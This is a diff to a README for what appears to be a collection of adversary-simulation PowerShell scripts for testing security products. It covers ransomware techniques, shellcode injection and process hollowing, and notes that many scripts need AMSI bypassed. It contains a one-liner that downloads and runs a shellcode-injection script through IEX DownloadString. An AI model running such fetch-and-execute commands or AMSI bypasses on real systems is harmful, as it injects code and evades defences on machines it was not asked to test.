@@ -9,6 +9,8 @@ In most cases, i tried to focus on stealthy and advanced behaviour.
 
 The scripts can be executed on production envirenmnet. 
 
+Please note that many of the scripts will not run unless AMSI is bypassed - each scripts different component of an attack chain and have to be viewed as part of a bigger picture
+
 **Example:**
 
 ## Ransomware techniques:
@@ -67,3 +69,8 @@ Shellcode injection and execution is one of the most popular living-off-the-land
 Injection of shellcode into the entry of a legitimate spawn process
 
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-ShellcodeInjection1.ps1"); Invoke-Shellcode1;`
+
+#### 2. Hollowing
+Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. 
+Process hollowing is a "living-off-the-land" method of executing arbitrary code in the address space of a separate live process. 
+https://attack.mitre.org/techniques/T1055/012/
